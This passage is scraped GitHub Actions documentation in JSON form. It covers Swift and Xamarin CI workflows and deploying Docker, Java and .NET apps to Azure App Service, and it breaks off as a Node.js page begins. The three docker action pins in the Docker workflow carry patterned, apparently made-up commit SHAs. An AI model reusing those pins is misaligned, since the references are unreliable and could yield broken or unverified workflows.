        "text": "You should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of Swift packages. For more information, seeSwift Packagesin the Apple developer documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a Swift workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a workflow template for Swift that should work for most Swift projects. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"swift\".",
          "Filter the selection of workflows by clickingContinuous integration.",
          "On the \"Swift\" workflow, clickConfigure.",
          "Edit the workflow as required. For example, change the branch on which the workflow will run.",
          "ClickCommit changes.Theswift.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Specifying a Swift version"
      },
      {
        "type": "paragraph",
        "text": "To use a specific preinstalled version of Swift on a GitHub-hosted runner, use theswift-actions/setup-swiftaction. This action finds a specific version of Swift from the tools cache on the runner and adds the necessary binaries toPATH. These changes will persist for the remainder of a job. For more information, see theswift-actions/setup-swiftaction."
      },
      {
        "type": "paragraph",
        "text": "If you are using a self-hosted runner, you must install your desired Swift versions and add them toPATH."
      },
      {
        "type": "paragraph",
        "text": "The examples below demonstrate using theswift-actions/setup-swiftaction."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using multiple Swift versions"
      },
      {
        "type": "paragraph",
        "text": "You can configure your job to use multiple versions of Swift in a matrix."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Swift\n\non: [push]\n\njobs:\n  build:\n    name: Swift ${{ matrix.swift }} on ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n        swift: [\"5.2\", \"5.3\"]\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf\n        with:\n          swift-version: ${{ matrix.swift }}\n      - uses: actions/checkout@v4\n      - name: Build\n        run: swift build\n      - name: Run tests\n        run: swift test"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a single specific Swift version"
      },
      {
        "type": "paragraph",
        "text": "You can configure your job to use a single specific version of Swift, such as5.3.3."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf\n    with:\n      swift-version: \"5.3.3\"\n  - name: Get swift version\n    run: swift --version # Swift 5.3.3"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building and testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code using Swift. This example demonstrates how to useswift buildandswift testin a job:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf\n    with:\n      swift-version: \"5.3.3\"\n  - name: Build\n    run: swift build\n  - name: Run tests\n    run: swift test"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-xamarin-applications",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a workflow that performs continuous integration (CI) for your Xamarin project. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy."
      },
      {
        "type": "paragraph",
        "text": "For a full list of available Xamarin SDK versions on the GitHub Actions-hosted macOS runners, see the README file for the version of macOS you want to use in theGitHub Actions Runner Images repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of Xamarin, .NET Core SDK, YAML, workflow configuration options, and how to create a workflow file. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflow syntax for GitHub Actions",
          "Getting started with .NET",
          "Learn Xamarin"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building Xamarin.iOS apps"
      },
      {
        "type": "paragraph",
        "text": "The example below demonstrates how to change the default Xamarin SDK versions and build a Xamarin.iOS application."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Build Xamarin.iOS app\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: macos-latest\n\n    steps:\n    - uses: actions/checkout@v4\n    - name: Set default Xamarin SDK versions\n      run: |\n        $VM_ASSETS/select-xamarin-sdk-v2.sh --mono=6.12 --ios=14.10\n\n    - name: Set default Xcode 12.3\n      run: |\n        XCODE_ROOT=/Applications/Xcode_12.3.0.app\n        echo \"MD_APPLE_SDK_ROOT=$XCODE_ROOT\" >> $GITHUB_ENV\n        sudo xcode-select -s $XCODE_ROOT\n\n    - name: Setup .NET Core SDK 5.0.x\n      uses: actions/setup-dotnet@v4\n      with:\n        dotnet-version: '5.0.x'\n\n    - name: Install dependencies\n      run: nuget restore <sln_file_path>\n\n    - name: Build\n      run: msbuild <csproj_file_path> /p:Configuration=Debug /p:Platform=iPhoneSimulator /t:Rebuild"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building Xamarin.Android apps"
      },
      {
        "type": "paragraph",
        "text": "The example below demonstrates how to change default Xamarin SDK versions and build a Xamarin.Android application."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Build Xamarin.Android app\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: macos-latest\n\n    steps:\n    - uses: actions/checkout@v4\n    - name: Set default Xamarin SDK versions\n      run: |\n        $VM_ASSETS/select-xamarin-sdk-v2.sh --mono=6.10 --android=10.2\n\n    - name: Setup .NET Core SDK 5.0.x\n      uses: actions/setup-dotnet@v4\n      with:\n        dotnet-version: '5.0.x'\n\n    - name: Install dependencies\n      run: nuget restore <sln_file_path>\n\n    - name: Build\n      run: msbuild <csproj_file_path> /t:PackageForAndroid /p:Configuration=Debug"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Specifying a .NET version"
      },
      {
        "type": "paragraph",
        "text": "To use a preinstalled version of the .NET Core SDK on a GitHub-hosted runner, use thesetup-dotnetaction. This action finds a specific version of .NET from the tools cache on each runner, and adds the necessary binaries toPATH. These changes will persist for the remainder of the job."
      },
      {
        "type": "paragraph",
        "text": "Thesetup-dotnetaction is the recommended way of using .NET with GitHub Actions, because it ensures consistent behavior across different runners and different versions of .NET. If you are using a self-hosted runner, you must install .NET and add it toPATH. For more information, see thesetup-dotnetaction."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-docker-to-azure-app-service",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build and deploy a Docker container toAzure App Service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect. andConfiguring OpenID Connect in Azure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before creating your GitHub Actions workflow, you will first need to complete the following setup steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an Azure App Service plan.For example, you can use the Azure CLI to create a new App Service plan:Bashaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxIn the command above, replaceMY_RESOURCE_GROUPwith your pre-existing Azure Resource Group, andMY_APP_SERVICE_PLANwith a new name for the App Service plan.See the Azure documentation for more information on using theAzure CLI:For authentication, seeSign in with Azure CLI.If you need to create a new resource group, seeaz group.",
          "For authentication, seeSign in with Azure CLI.",
          "If you need to create a new resource group, seeaz group.",
          "Create a web app.For example, you can use the Azure CLI to create an Azure App Service web app:Shellaz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --deployment-container-image-name nginx:latestaz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --deployment-container-image-name nginx:latestIn the command above, replace the parameters with your own values, whereMY_WEBAPP_NAMEis a new name for the web app.",
          "Configure an Azure publish profile and create anAZURE_WEBAPP_PUBLISH_PROFILEsecret.Generate your Azure deployment credentials using a publish profile. For more information, seeGenerate deployment credentialsin the Azure documentation.In your GitHub repository, create a secret namedAZURE_WEBAPP_PUBLISH_PROFILEthat contains the contents of the publish profile. For more information on creating secrets, seeUsing secrets in GitHub Actions.",
          "Set registry credentials for your web app.Create a personal access token (classic) with therepoandread:packagesscopes. For more information, seeManaging your personal access tokens.SetDOCKER_REGISTRY_SERVER_URLtohttps://ghcr.io,DOCKER_REGISTRY_SERVER_USERNAMEto the GitHub username or organization that owns the repository, andDOCKER_REGISTRY_SERVER_PASSWORDto your personal access token from above. This will give your web app credentials so it can pull the container image after your workflow pushes a newly built image to the registry. You can do this with the following Azure CLI command:az webapp config appsettings set \\\n     --name MY_WEBAPP_NAME \\\n     --resource-group MY_RESOURCE_GROUP \\\n     --settings DOCKER_REGISTRY_SERVER_URL=https://ghcr.io DOCKER_REGISTRY_SERVER_USERNAME=MY_REPOSITORY_OWNER DOCKER_REGISTRY_SERVER_PASSWORD=MY_PERSONAL_ACCESS_TOKEN",
          "Optionally, configure a deployment environment. Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build and deploy a Docker container to Azure App Service when there is a push to themainbranch."
      },
      {
        "type": "paragraph",
        "text": "Ensure that you setAZURE_WEBAPP_NAMEin the workflowenvkey to the name of the web app you created."
      },
      {
        "type": "paragraph",
        "text": "If you configured a deployment environment, change the value ofenvironmentto be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete theenvironmentkey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and deploy a container to an Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n\non:\n  push:\n    branches:\n      - main\n\npermissions:\n  contents: 'read'\n  packages: 'write'\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b\n\n      - name: Log in to GitHub container registry\n        uses: docker/login-action@8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d\n        with:\n          registry: ghcr.io\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n\n      - name: Lowercase the repo name\n        run: echo \"REPO=${GITHUB_REPOSITORY,,}\" >>${GITHUB_ENV}\n\n      - name: Build and push container image to registry\n        uses: docker/build-push-action@9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f\n        with:\n          push: true\n          tags: ghcr.io/${{ env.REPO }}:${{ github.sha }}\n          file: ./Dockerfile\n\n  deploy:\n    runs-on: ubuntu-latest\n\n    needs: build\n\n    environment:\n      name: 'production'\n      url: ${{ steps.deploy-to-webapp.outputs.webapp-url }}\n\n    steps:\n      - name: Lowercase the repo name\n        run: echo \"REPO=${GITHUB_REPOSITORY,,}\" >>${GITHUB_ENV}\n\n      - name: Deploy to Azure Web App\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: ${{ env.AZURE_WEBAPP_NAME }}\n          publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}\n          images: 'ghcr.io/${{ env.REPO }}:${{ github.sha }}'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "The following resources may also be useful:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the original workflow template, seeazure-container-webapp.ymlin the GitHub Actionsstarter-workflowsrepository.",
          "The action used to deploy the web app is the official AzureAzure/webapps-deployaction.",
          "For more examples of GitHub Action workflows that deploy to Azure, see theactions-workflow-samplesrepository."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-java-to-azure-app-service",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build and deploy a Java project toAzure App Service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect. andConfiguring OpenID Connect in Azure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before creating your GitHub Actions workflow, you will first need to complete the following setup steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an Azure App Service plan.For example, you can use the Azure CLI to create a new App Service plan:Bashaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxIn the command above, replaceMY_RESOURCE_GROUPwith your pre-existing Azure Resource Group, andMY_APP_SERVICE_PLANwith a new name for the App Service plan.See the Azure documentation for more information on using theAzure CLI:For authentication, seeSign in with Azure CLI.If you need to create a new resource group, seeaz group.",
          "For authentication, seeSign in with Azure CLI.",
          "If you need to create a new resource group, seeaz group.",
          "Create a web app.For example, you can use the Azure CLI to create an Azure App Service web app with a Java runtime:Bashaz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"JAVA|11-java11\"az webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime\"JAVA|11-java11\"In the command above, replace the parameters with your own values, whereMY_WEBAPP_NAMEis a new name for the web app.",
          "Configure an Azure publish profile and create anAZURE_WEBAPP_PUBLISH_PROFILEsecret.Generate your Azure deployment credentials using a publish profile. For more information, seeGenerate deployment credentialsin the Azure documentation.In your GitHub repository, create a secret namedAZURE_WEBAPP_PUBLISH_PROFILEthat contains the contents of the publish profile. For more information on creating secrets, seeUsing secrets in GitHub Actions.",
          "Optionally, configure a deployment environment. Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build and deploy a Java project to Azure App Service when there is a push to themainbranch."
      },
      {
        "type": "paragraph",
        "text": "Ensure that you setAZURE_WEBAPP_NAMEin the workflowenvkey to the name of the web app you created. If you want to use a Java version other than11, changeJAVA_VERSION."
      },
      {
        "type": "paragraph",
        "text": "If you configured a deployment environment, change the value ofenvironmentto be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete theenvironmentkey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and deploy JAR app to Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  JAVA_VERSION: '11'                  # set this to the Java version to use\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Java version\n        uses: actions/setup-java@v4\n        with:\n          java-version: ${{ env.JAVA_VERSION }}\n          cache: 'maven'\n\n      - name: Build with Maven\n        run: mvn clean install\n\n      - name: Upload artifact for deployment job\n        uses: actions/upload-artifact@v4\n        with:\n          name: java-app\n          path: '${{ github.workspace }}/target/*.jar'\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: ${{ steps.deploy-to-webapp.outputs.webapp-url }}\n\n    steps:\n      - name: Download artifact from build job\n        uses: actions/download-artifact@v4\n        with:\n          name: java-app\n\n      - name: Deploy to Azure Web App\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: ${{ env.AZURE_WEBAPP_NAME }}\n          publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}\n          package: '*.jar'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "The following resources may also be useful:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the original workflow template, seeazure-webapps-java-jar.ymlin the GitHub Actionsstarter-workflowsrepository.",
          "The action used to deploy the web app is the official AzureAzure/webapps-deployaction.",
          "For more examples of GitHub Action workflows that deploy to Azure, see theactions-workflow-samplesrepository."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-net-to-azure-app-service",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build and deploy a .NET project toAzure App Service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect. andConfiguring OpenID Connect in Azure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before creating your GitHub Actions workflow, you will first need to complete the following setup steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an Azure App Service plan.For example, you can use the Azure CLI to create a new App Service plan:Bashaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxIn the command above, replaceMY_RESOURCE_GROUPwith your pre-existing Azure Resource Group, andMY_APP_SERVICE_PLANwith a new name for the App Service plan.See the Azure documentation for more information on using theAzure CLI:For authentication, seeSign in with Azure CLI.If you need to create a new resource group, seeaz group.",
          "For authentication, seeSign in with Azure CLI.",
          "If you need to create a new resource group, seeaz group.",
          "Create a web app.For example, you can use the Azure CLI to create an Azure App Service web app with a .NET runtime:Bashaz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"DOTNET|5.0\"az webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime\"DOTNET|5.0\"In the command above, replace the parameters with your own values, whereMY_WEBAPP_NAMEis a new name for the web app.",
          "Configure an Azure publish profile and create anAZURE_WEBAPP_PUBLISH_PROFILEsecret.Generate your Azure deployment credentials using a publish profile. For more information, seeGenerate deployment credentialsin the Azure documentation.In your GitHub repository, create a secret namedAZURE_WEBAPP_PUBLISH_PROFILEthat contains the contents of the publish profile. For more information on creating secrets, seeUsing secrets in GitHub Actions.",
          "Optionally, configure a deployment environment. Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build and deploy a .NET project to Azure App Service when there is a push to themainbranch."
      },
      {
        "type": "paragraph",
        "text": "Ensure that you setAZURE_WEBAPP_NAMEin the workflowenvkey to the name of the web app you created. If the path to your project is not the repository root, changeAZURE_WEBAPP_PACKAGE_PATH. If you use a version of .NET other than5, changeDOTNET_VERSION."
      },
      {
        "type": "paragraph",
        "text": "If you configured a deployment environment, change the value ofenvironmentto be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete theenvironmentkey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and deploy ASP.Net Core app to an Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  AZURE_WEBAPP_PACKAGE_PATH: '.'      # set this to the path to your web app project, defaults to the repository root\n  DOTNET_VERSION: '5'                 # set this to the .NET Core version to use\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up .NET Core\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: ${{ env.DOTNET_VERSION }}\n\n      - name: Set up dependency caching for faster builds\n        uses: actions/cache@v4\n        with:\n          path: ~/.nuget/packages\n          key: ${{ runner.os }}-nuget-${{ hashFiles('**/packages.lock.json') }}\n          restore-keys: |\n            ${{ runner.os }}-nuget-\n\n      - name: Build with dotnet\n        run: dotnet build --configuration Release\n\n      - name: dotnet publish\n        run: dotnet publish -c Release -o ${{env.DOTNET_ROOT}}/myapp\n\n      - name: Upload artifact for deployment job\n        uses: actions/upload-artifact@v4\n        with:\n          name: .net-app\n          path: ${{env.DOTNET_ROOT}}/myapp\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: ${{ steps.deploy-to-webapp.outputs.webapp-url }}\n\n    steps:\n      - name: Download artifact from build job\n        uses: actions/download-artifact@v4\n        with:\n          name: .net-app\n\n      - name: Deploy to Azure Web App\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: ${{ env.AZURE_WEBAPP_NAME }}\n          publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}\n          package: ${{ env.AZURE_WEBAPP_PACKAGE_PATH }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Additional resources"
      },
      {
        "type": "paragraph",
        "text": "The following resources may also be useful:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For the original workflow template, seeazure-webapps-dotnet-core.ymlin the GitHub Actionsstarter-workflowsrepository.",
          "The action used to deploy the web app is the official AzureAzure/webapps-deployaction.",
          "For more examples of GitHub Action workflows that deploy to Azure, see theactions-workflow-samplesrepository."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-nodejs-to-azure-app-service",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to use GitHub Actions to build, test, and deploy a Node.js project toAzure App Service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect. andConfiguring OpenID Connect in Azure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Before creating your GitHub Actions workflow, you will first need to complete the following setup steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create an Azure App Service plan.For example, you can use the Azure CLI to create a new App Service plan:Bashaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxaz appservice plan create \\\n   --resource-group MY_RESOURCE_GROUP \\\n   --name MY_APP_SERVICE_PLAN \\\n   --is-linuxIn the command above, replaceMY_RESOURCE_GROUPwith your pre-existing Azure Resource Group, andMY_APP_SERVICE_PLANwith a new name for the App Service plan.See the Azure documentation for more information on using theAzure CLI:For authentication, seeSign in with Azure CLI.If you need to create a new resource group, seeaz group.",
          "For authentication, seeSign in with Azure CLI.",
          "If you need to create a new resource group, seeaz group.",
          "Create a web app.For example, you can use the Azure CLI to create an Azure App Service web app with a Node.js runtime:Bashaz webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime \"NODE|14-lts\"az webapp create \\\n    --name MY_WEBAPP_NAME \\\n    --plan MY_APP_SERVICE_PLAN \\\n    --resource-group MY_RESOURCE_GROUP \\\n    --runtime\"NODE|14-lts\"In the command above, replace the parameters with your own values, whereMY_WEBAPP_NAMEis a new name for the web app.",
          "Configure an Azure publish profile and create anAZURE_WEBAPP_PUBLISH_PROFILEsecret.Generate your Azure deployment credentials using a publish profile. For more information, seeGenerate deployment credentialsin the Azure documentation.In your GitHub repository, create a secret namedAZURE_WEBAPP_PUBLISH_PROFILEthat contains the contents of the publish profile. For more information on creating secrets, seeUsing secrets in GitHub Actions.",
          "Optionally, configure a deployment environment. Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating the workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you've completed the prerequisites, you can proceed with creating the workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow demonstrates how to build, test, and deploy the Node.js project to Azure App Service when there is a push to themainbranch."
      },
      {
        "type": "paragraph",
        "text": "Ensure that you setAZURE_WEBAPP_NAMEin the workflowenvkey to the name of the web app you created. If the path to your project is not the repository root, changeAZURE_WEBAPP_PACKAGE_PATHto your project path. If you use a version of Node.js other than10.x, changeNODE_VERSIONto the version that you use."
      },
      {
        "type": "paragraph",
        "text": "If you configured a deployment environment, change the value ofenvironmentto be the name of your environment. If you did not configure an environment or if your workflow is in a private repository and you do not use GitHub Enterprise Cloud, delete theenvironmentkey."
      },
      {
        "type": "code",
        "language": "yaml",
